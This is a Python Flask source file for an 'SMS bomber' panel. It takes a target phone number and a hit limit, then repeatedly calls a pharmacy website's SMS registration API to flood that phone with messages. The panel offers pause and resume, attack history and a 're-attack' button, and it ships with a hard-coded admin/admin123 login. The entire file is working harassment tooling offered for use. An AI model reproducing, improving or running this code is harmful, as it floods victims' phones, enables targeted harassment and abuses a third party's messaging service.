import requests
import threading
import os
import time
import sqlite3
import random
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ---------- [FEATURE: BST BD TIME ZONE] ----------
def get_bd_time():
    return datetime.now(timezone(timedelta(hours=6)))

# ---------- [DATABASE SETUP] ----------
def get_db():
    conn = sqlite3.connect('rk_v12_final.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, fail INTEGER, total INTEGER, limit_amt INTEGER, 
            status TEXT, start_time TEXT, stop_time TEXT, duration TEXT, 
            date_str TEXT, timestamp DATETIME)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        try:
            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("admin123"), "active"))
        except: pass

init_db()

# ---------- [CORE TURBO ENGINE WITH PAUSE/RESUME] ----------
active_sessions = {}

def send_request(phone):
    api_list = ["https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}"]
    try:
        res = requests.get(random.choice(api_list).format(phone), timeout=6)
        return res.status_code == 200
    except: return False

def bombing_task(username, phone, limit, start_dt):
    key = f"{username}_{phone}"
    with ThreadPoolExecutor(max_workers=5) as executor:
        while key in active_sessions:
            curr = active_sessions[key]
            if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped': break
            if curr['status'] == 'Running':
                now = get_bd_time()
                elapsed = now - start_dt
                active_sessions[key]['running_time'] = str(elapsed).split('.')[0]
                if executor.submit(send_request, phone).result():
                    active_sessions[key]['success'] += 1
                else: active_sessions[key]['fail'] += 1
                active_sessions[key]['total'] += 1
                if active_sessions[key]['total'] > 1:
                    avg = elapsed.total_seconds() / active_sessions[key]['total']
                    active_sessions[key]['eta'] = str(timedelta(seconds=int(avg * (limit - active_sessions[key]['total']))))
                time.sleep(0.15)
            else: time.sleep(1)

    stop_dt = get_bd_time()
    s = active_sessions.get(key)
    if s and s['status'] != 'Paused':
        with get_db() as conn:
            conn.execute("INSERT INTO history (username, phone, success, fail, total, limit_amt, status, start_time, stop_time, duration, date_str, timestamp) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
                (username, phone, s['success'], s['fail'], s['total'], limit, "Completed", s['start_time'], stop_dt.strftime("%I:%M %p"), s['running_time'], start_dt.strftime("%d/%m/%Y"), start_dt))
        del active_sessions[key]

# ---------- [PREMIUM UI LAYOUT WITH 3-DOT MENU] ----------
LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-V12 ULTIMATE</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --bg: #010101; --card: #080808; --red: #ff0055; --blue: #00ccff; --gold: #ffcc00; --purple: #bc13fe; }
        body { background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; margin: 0; }
        
        .nav { background: #000; padding: 15px 25px; border-bottom: 2px solid var(--neon); display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:1000; }
        .logo { font-family: 'Orbitron'; font-weight: 900; color: var(--neon); text-shadow: 0 0 10px var(--neon); cursor:pointer; }
        
        /* 3-DOT MENU STYLES */
        .three-dot { cursor: pointer; padding: 5px; position: relative; z-index: 2001; }
        .dot { height: 4px; width: 4px; background: var(--neon); border-radius: 50%; display: block; margin: 3px; box-shadow: 0 0 5px var(--neon); }
        .menu-dropdown { 
            position: absolute; right: 20px; top: 65px; background: var(--card); border: 1.5px solid var(--neon); 
            border-radius: 12px; width: 220px; display: none; z-index: 2000; box-shadow: 0 0 30px rgba(0,255,204,0.4); 
            overflow: hidden;
        }
        .menu-dropdown a { 
            display: block; padding: 14px 20px; color: #fff; text-decoration: none; 
            font-family: 'Orbitron'; font-size: 11px; border-bottom: 1px solid #1a1a1a; transition: 0.3s;
        }
        .menu-dropdown a:hover { background: var(--neon); color: #000; font-weight: bold; }
        .menu-dropdown b { margin-right: 12px; }

        .container { padding: 20px; max-width: 500px; margin: auto; }
        .monitor-frame { position: relative; background: #000; border-radius: 15px; padding: 3px; overflow: hidden; margin-bottom: 25px; }
        .monitor-frame::before { content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(var(--neon), var(--blue), var(--purple), var(--gold), var(--neon)); animation: rotate 3s linear infinite; }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .monitor-content { position: relative; background: var(--card); border-radius: 12px; padding: 20px; z-index: 2; }
        
        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
        .info-box { background: rgba(255,255,255,0.03); border: 1px solid #222; padding: 12px; border-radius: 8px; text-align: center; }
        .info-box span { display: block; font-size: 9px; color: #777; font-weight: bold; text-transform: uppercase; }
        .info-box b { font-family: 'Orbitron'; font-size: 1.1rem; }
        
        input { width: 100%; padding: 14px; margin: 10px 0; background: #000; border: 1px solid #333; color: var(--neon); border-radius: 10px; font-family: 'Orbitron'; box-sizing: border-box; outline: none; border-left: 3px solid var(--neon); }
        .btn-turbo { background: linear-gradient(90deg, var(--neon), var(--blue)); color: #000; border: none; padding: 16px; width: 100%; border-radius: 10px; font-family: 'Orbitron'; font-weight: 900; cursor: pointer; text-transform: uppercase; }
        .btn-ctrl { flex: 1; padding: 10px; border: none; border-radius: 8px; font-family: 'Orbitron'; font-size: 9px; font-weight: 900; cursor: pointer; transition: 0.2s; }
        .bg-pause { background: var(--gold); color: #000; }
        .bg-stop { background: var(--red); color: #fff; }
        
        .progress-bar { height: 6px; background: #111; border-radius: 3px; margin: 15px 0; overflow: hidden; }
        .progress-fill { height: 100%; background: var(--neon); transition: 0.4s linear; }
        .c-success { color: var(--neon); } .c-fail { color: var(--red); } .c-blue { color: var(--blue); } .c-gold { color: var(--gold); }
    </style>
</head>
<body onclick="document.getElementById('mBox').style.display='none'">
    <audio id="snd_start" src="https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3"></audio>
    
    <nav class="nav">
        <div class="logo" onclick="location.href='/dashboard'">RK-ULTIMATE</div>
        <div class="three-dot" onclick="event.stopPropagation(); let m=document.getElementById('mBox'); m.style.display=(m.style.display==='block'?'none':'block')">
            <span class="dot"></span><span class="dot"></span><span class="dot"></span>
        </div>
    </nav>

    <div class="menu-dropdown" id="mBox">
        <a href="/history"><b class="c-neon">1.</b> ALL HISTORY</a>
        <a href="/running-logs"><b class="c-gold">2.</b> RUNNING HISTORY</a>
        <a href="/last-attack"><b class="c-blue">3.</b> LAST ATTACK</a>
        <a href="https://t.me/your_admin" target="_blank"><b class="c-purple">4.</b> CONTACT ADMIN</a>
        <a href="/profile"><b class="c-blue">5.</b> PROFILES</a>
        <a href="/logout" style="color:var(--red); border-top: 1px solid #333;"><b class="c-fail">!</b> LOGOUT SYSTEM</a>
    </div>

    <div class="container">[CONTENT]</div>

    <script>
        function sync() {
            let area = document.getElementById('live-engine'); if(!area) return;
            fetch('/api/status').then(r=>r.json()).then(data=>{
                let html = '';
                for(let k in data){
                    let s = data[k]; let p = (s.total/s.limit)*100;
                    html += `<div class="monitor-frame"><div class="monitor-content">
                        <div style="display:flex; justify-content:space-between;"><b>TARGET: <span class="c-blue">${s.phone}</span></b><span style="background:${s.status==='Running'?'var(--neon)':'var(--gold)'}; color:#000; padding:2px 8px; border-radius:4px; font-size:9px; font-weight:bold;">${s.status}</span></div>
                        <div class="progress-bar"><div class="progress-fill" style="width:${p}%"></div></div>
                        <div style="display:flex; justify-content:space-between; font-size:0.75rem; font-family:Orbitron; color:var(--gold);"><span>⏱ ${s.running_time}</span><span>⏳ ${s.eta}</span></div>
                        <div class="info-grid">
                            <div class="info-box"><span>SUCCESS</span><b class="c-success">${s.success}</b></div>
                            <div class="info-box"><span>FAILED</span><b class="c-fail">${s.fail}</b></div>
                            <div class="info-box"><span>SENT</span><b>${s.total}/${s.limit}</b></div>
                            <div class="info-box"><span>START</span><b style="font-size:0.7rem;">${s.start_time}</b></div>
                        </div>
                        <div style="display:flex; gap:10px; margin-top:15px;">
                            <button class="btn-ctrl bg-pause" onclick="location.href='/api/control?num=${s.phone}&action=${s.status==='Running'?'Paused':'Running'}'">${s.status==='Running'?'PAUSE':'RESUME'}</button>
                            <button class="btn-ctrl bg-stop" onclick="location.href='/api/stop?num=${s.phone}'">TERMINATE</button>
                        </div>
                    </div></div>`;
                } area.innerHTML = html;
            });
        } setInterval(sync, 1500);
    </script>
</body></html>
'''

# ---------- [ROUTES] ----------
@app.route('/')
def root(): return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session['user'] = u; return redirect(url_for('dashboard'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="monitor-frame"><div class="monitor-content" style="text-align:center;"><h3>SYSTEM ACCESS</h3><form method="POST"><input name="u" placeholder="Admin ID"><input name="p" type="password" placeholder="Pass-Key"><button class="btn-turbo">INITIALIZE</button></form></div></div>'))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="monitor-frame"><div class="monitor-content"><h3 class="c-neon">🚀 MISSION CONTROL</h3><form action="/api/start" onsubmit="document.getElementById(\'snd_start\').play()"><input name="num" placeholder="Target Number" required><input name="amt" type="number" placeholder="Hit Limit" required><button class="btn-turbo">LAUNCH ATTACK</button></form></div></div><div id="live-engine"></div>'))

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn: logs = conn.execute("SELECT phone, COUNT(*) as sessions, SUM(success) as total_ok FROM history GROUP BY phone ORDER BY id DESC").fetchall()
    html = '<h3 class="c-blue">📂 GROUPED HISTORY</h3>'
    for l in logs:
        html += f'<div class="monitor-frame" onclick="location.href=\'/history/{l["phone"]}\'"><div class="monitor-content" style="cursor:pointer;"><b class="c-gold">{l["phone"]}</b><br><small>Total Hits: {l["total_ok"]} | Sessions: {l["sessions"]}</small></div></div>'
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

@app.route('/history/<num>')
def history_detail(num):
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn: logs = conn.execute("SELECT * FROM history WHERE phone=? ORDER BY id DESC", (num,)).fetchall()
    html = f'<h3>📜 DETAILS: <span class="c-blue">{num}</span></h3>'
    for l in logs:
        html += f'''<div class="monitor-frame"><div class="monitor-content">
            <span class="c-gold">TIME: {l["start_time"]} - {l["stop_time"]}</span><br>
            <span class="c-success">OK: {l["success"]}</span> | <span class="c-fail">FAIL: {l["fail"]}</span><br>
            <span>DUR: {l["duration"]}</span> | <span>DATE: {l["date_str"]}</span><br>
            <button class="btn-turbo" style="margin-top:10px; padding:5px; font-size:10px;" onclick="location.href='/api/start?num={num}&amt={l["limit_amt"]}'">RE-ATTACK ({l["limit_amt"]})</button>
        </div></div>'''
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

@app.route('/last-attack')
def last_attack():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn: l = conn.execute("SELECT * FROM history ORDER BY id DESC LIMIT 1").fetchone()
    if not l: return redirect(url_for('dashboard'))
    return render_template_string(LAYOUT.replace('[CONTENT]', f'<h3>🔥 LAST MISSION</h3><div class="monitor-frame"><div class="monitor-content"><b class="c-blue">{l["phone"]}</b><br>Success: {l["success"]}<br>Time: {l["start_time"]}</div></div>'))

@app.route('/profile', methods=['GET', 'POST'])
def profile():
    if 'user' not in session: return redirect(url_for('login'))
    msg = ""
    if request.method == 'POST':
        old, new = request.form.get('old'), request.form.get('new')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (session['user'],)).fetchone()
            if check_password_hash(user['password'], old):
                conn.execute("UPDATE users SET password=? WHERE username=?", (generate_password_hash(new), session['user']))
                msg = "Password Updated!"
            else: msg = "Old Password Error!"
    return render_template_string(LAYOUT.replace('[CONTENT]', f'''<div class="monitor-frame"><div class="monitor-content"><h3>👤 PROFILE</h3><p>User: {session['user']}</p><hr><h4>CHANGE KEY</h4><p class="c-neon">{msg}</p><form method="POST"><input name="old" type="password" placeholder="Current Key"><input name="new" type="password" placeholder="New Key"><button class="btn-turbo">UPDATE SYSTEM KEY</button></form></div></div>'''))

@app.route('/running-logs')
def running_logs(): return render_template_string(LAYOUT.replace('[CONTENT]', '<h3>⏳ RUNNING MISSIONS</h3><div id="live-engine"></div>'))

@app.route('/api/start')
def api_start():
    u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
    if u and num and amt:
        now = get_bd_time(); key = f"{u}_{num}"
        active_sessions[key] = {'phone': num, 'success': 0, 'fail': 0, 'total': 0, 'limit': int(amt), 'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'running_time': '0:00:00', 'eta': '---'}
        threading.Thread(target=bombing_task, args=(u, num, int(amt), now), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status(): return jsonify({k: v for k, v in active_sessions.items() if k.startswith(session.get('user', ''))})

@app.route('/api/control')
def api_control():
    key = f"{session['user']}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = request.args.get('action')
    return redirect(url_for('dashboard'))

@app.route('/api/stop')
def api_stop():
    key = f"{session['user']}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=54300)
